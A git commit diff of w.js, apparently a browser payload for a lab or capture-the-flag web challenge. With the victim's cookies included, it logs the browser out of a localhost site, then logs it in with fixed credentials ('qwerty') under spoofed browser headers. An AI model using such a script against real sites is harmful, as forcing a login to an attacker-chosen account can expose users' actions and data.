efd1b485654e3515f6bb8695308bf58d22567717
GoldenSheep <805069152@qq.com>
2024-03-23 17:58:35 +0800

    Update w.js

--- w.js
+++ w.js
@@ -4,20 +4,33 @@
         method: 'GET',
         credentials: 'include'
     }).then(response => {
-        if (!response.ok) {
-            throw new Error('Logout failed');
-        }
-        console.log('Logout successful');
-        // 第二步：登录并尝试注册新用户（用户名和密码都是test2）
+        // 不管注销是否成功，都继续尝试登录
+        console.log('Attempted to logout.');
+        // 第二步：登录并尝试注册新用户
         return fetch('http://127.0.0.1/login', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/x-www-form-urlencoded',
+                // 包括其他头信息
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.5',
+                'Accept-Encoding': 'gzip, deflate',
+                'Referer': 'http://127.0.0.1/login',
+                'Origin': 'http://127.0.0.1',
+                'Connection': 'close',
+                'Upgrade-Insecure-Requests': '1',
+                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0'
             },
-            body: 'username=test4&password=testtest'
+            credentials: 'include',
+            body: 'username=qwerty&password=qwerty'
         });
+    }).then(response => {
+        if (!response.ok) {
+            throw new Error('Login failed');
+        }
+        return response.text();
     }).then(result => {
-        console.log('Report successful', result);
+        console.log('Login successful', result);
     }).catch(error => {
         console.error('An error occurred:', error);
     });
